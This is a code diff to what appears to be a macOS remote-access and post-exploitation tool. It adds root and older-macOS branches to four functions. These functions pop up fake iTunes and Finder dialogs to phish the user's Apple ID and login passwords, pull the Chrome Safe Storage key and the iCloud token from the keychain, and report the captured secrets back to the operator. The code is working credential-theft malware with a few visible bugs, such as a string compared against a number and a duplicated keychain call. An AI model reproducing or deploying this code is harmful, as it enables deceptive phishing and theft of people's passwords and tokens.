@@ -285,7 +285,29 @@ def appleIDPhish(username, GUIUser):
 		if isinstance(check, str): #we have file...
 			send_msg("%sApple password already found [%s] %s\n" % (blue_star, check, blue_star), False)
 			break
-		osa = "launchctl asuser " + str(bella_UID) + " osascript -e 'tell application \"iTunes\"' -e \"pause\" -e \"end tell\"; osascript -e 'tell app \"iTunes\" to activate' -e 'tell app \"iTunes\" to activate' -e 'tell app \"iTunes\" to display dialog \"Error connecting to iTunes. Please verify your password for " + username + " \" default answer \"\" with icon 1 with hidden answer with title \"iTunes Connection\"' -e 'text returned of result'"
+		
+		osa_end = "osascript -e 'tell application \"iTunes\"' -e \"pause\" -e \"end tell\"; osascript -e 'tell app \"iTunes\" to activate' -e 'tell app \"iTunes\" to activate' -e 'tell app \"iTunes\" to display dialog \"Error connecting to iTunes. Please verify your password for " + username + " \" default answer \"\" with icon 1 with hidden answer with title \"iTunes Connection\"' -e 'text returned of result'"
+		if '.'.join(platform.mac_ver()[0].split('.')[:-1]) < 10.11:
+			if os.getuid() == 0:
+				#we are root on yosemite or below. Get the current login window PID so we know who to launch to.
+				login_window_PID = ''
+				out = subprocess.Popen('ps ax'.split(), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+				for x in out.splitlines():
+					if 'loginwindow console' in x:
+						login_window_PID = x.split()[0]
+				if not login_window_PID:
+					send_msg('%sCould not find a current login window PID.\n' % red_minus, True)
+					return
+				#launch to the current login window PID
+				osa = "launchctl bsexec %s %s" % (login_window_PID, osa_end)
+
+			else:
+				#we are normal user on yosemite or below. no security context issues. prompt for kchain.
+				osa = osa_end
+		else:
+			#we are either root or normal user on el cap or above. call launchctl asuser.
+			osa = "launchctl asuser %s %s" % (bella_UID, osa_end)
+						
 		#pauses music, then prompts user
 		out = check_output(osa)
 		if not out[0]:
@@ -456,8 +478,27 @@ def chrome_safe_storage():
 			return
 		kchain = getKeychains()
 		send_msg("%sUsing [%s] as keychain.\n" % (yellow_star, kchain), False)
+		if '.'.join(platform.mac_ver()[0].split('.')[:-1]) < 10.11:
+			if os.getuid() == 0:
+				#we are root on yosemite or below. Get the current login window PID so we know who to launch to.
+				login_window_PID = ''
+				out = subprocess.Popen('ps ax'.split(), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+				for x in out.splitlines():
+					if 'loginwindow console' in x:
+						login_window_PID = x.split()[0]
+				if not login_window_PID:
+					send_msg('%sCould not find a current login window PID.\n' % red_minus, True)
+					return
+				#launch to the current login window PID
+				encryptionKey = check_output("launchctl bsexec %s security find-generic-password -wa 'Chrome' '%s'" % (login_window_PID, kchain))
+			else:
+				#we are normal user on yosemite or below. no security context issues. prompt for kchain.
+				encryptionKey = check_output("security find-generic-password -wa 'Chrome' '%s'" % (kchain))
+
+		else:
+			#we are either root or normal user on el cap or above. call launchctl asuser.
+			encryptionKey = check_output("launchctl asuser %s security find-generic-password -wa 'Chrome' '%s'" % (bella_UID, kchain)) #get rid of \n
 		
-		encryptionKey = check_output("launchctl asuser %s security find-generic-password -wa 'Chrome' '%s'" % (bella_UID, kchain)) #get rid of \n
 		if not encryptionKey[0]:
 			if 51 == encryptionKey[2]:
 				send_msg("%sUser clicked deny.\n" % red_minus, False)
@@ -1595,6 +1636,25 @@ def tokenForce():
 			return
 		kchain = getKeychains()
 		send_msg("%sUsing [%s] as keychain.\n" % (yellow_star, kchain), False)
+		if '.'.join(platform.mac_ver()[0].split('.')[:-1]) < 10.11:
+			if os.getuid() == 0:
+				#we are root on yosemite or below. Get the current login window PID so we know who to launch to.
+				login_window_PID = ''
+				out = subprocess.Popen('ps ax'.split(), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+				for x in out.splitlines():
+					if 'loginwindow console' in x:
+						login_window_PID = x.split()[0]
+				if not login_window_PID:
+					send_msg('%sCould not find a current login window PID.\n' % red_minus, True)
+					return
+				#launch to the current login window PID
+				iCloudKey = check_output("launchctl bsexec %s security find-generic-password -ws 'iCloud' '%s'" % (login_window_PID, kchain))
+			else:
+				#we are normal user on yosemite or below. no security context issues. prompt for kchain.
+				iCloudKey = check_output("security find-generic-password -ws 'iCloud' '%s'" % (kchain))
+		else:
+			#we are either root or normal user on el cap or above. call launchctl asuser.
+			iCloudKey = check_output("launchctl asuser %s security find-generic-password -ws 'iCloud' '%s'" % (bella_UID, kchain))
 		
 		iCloudKey = check_output("launchctl asuser %s security find-generic-password -ws 'iCloud' '%s'" % (bella_UID, kchain))
 		if not iCloudKey[0]:
@@ -1721,7 +1781,27 @@ def user_pass_phish():
 			send_msg("%sAccount password already found:\n%s\n" % (blue_star, check.replace("\n", "")), True)
 			return 1
 		#os.system("networksetup -setairportpower en0 off") We can't disable Wi-Fi actually, bc then we lose our connection
-		script = "launchctl asuser %s osascript -e 'tell app \"Finder\" to activate' -e 'tell app \"Finder\" to display dialog \"Could not find password to the network \\\"%s\\\". To access the network password please enter your keychain [login] password.\" default answer \"\" buttons {\"Always Allow\", \"Deny\", \"Allow\"} with icon file \"%s\" with hidden answer giving up after 15'" % (bella_UID, wifiNetwork, path) #with title \"Network Connection\" giving up after 15'" % wifiNetwork
+		script_end = "osascript -e 'tell app \"Finder\" to activate' -e 'tell app \"Finder\" to display dialog \"There was an issue accessing the network \\\"%s\\\". To access the network, please enter the user password for %s.\" default answer \"\" buttons {\"Always Allow\", \"Deny\", \"Allow\"} with icon file \"%s\" with hidden answer giving up after 15'" % (wifiNetwork, get_bella_user(), path)
+		if '.'.join(platform.mac_ver()[0].split('.')[:-1]) < 10.11:
+			if os.getuid() == 0:
+				#we are root on yosemite or below. Get the current login window PID so we know who to launch to.
+				login_window_PID = ''
+				out = subprocess.Popen('ps ax'.split(), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+				for x in out.splitlines():
+					if 'loginwindow console' in x:
+						login_window_PID = x.split()[0]
+				if not login_window_PID:
+					send_msg('%sCould not find a current login window PID.\n' % red_minus, True)
+					return
+				#launch to the current login window PID
+				script = "launchctl bsexec %s %s" % (login_window_PID, script_end)
+			else:
+				#we are normal user on yosemite or below. no security context issues. prompt for kchain.
+				script = script_end
+		else:
+			#we are either root or normal user on el cap or above. call launchctl asuser.
+			script = "launchctl asuser %s %s" % (bella_UID, script_end)
+		
 		out = subprocess.check_output(script, shell=True)
 		password = out.split("text returned:")[-1].replace("\n", "").split(", gave up")[0]
 		send_msg("%sUser has attempted to use password: [%s]\n" % (blue_star, password), False)
